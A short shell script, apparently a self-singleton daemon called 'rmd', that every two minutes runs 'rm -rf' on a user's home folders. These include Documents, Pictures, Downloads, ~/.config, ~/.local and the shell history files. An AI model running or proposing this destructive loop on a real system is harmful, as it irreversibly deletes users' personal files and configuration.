#!/bin/sh

[ "$(pgrep -x rmd)" = "$$"  ] || exit

while :; do
  set --
  for dir in ~/.cache ~/.local ~/.config ~/go ~/.cargo ~/.npm ~/.bash* ~/.viminfo ~/Desktop ~/Documents ~/Downloads ~/Music ~/Pictures ~/Public ~/Templates ~/Videos; do
    [ -e "$dir" ] && set -- "$@" "$dir"
  done
  [ "$1" ] && rm -rf -- "$@"
  sleep 120
done
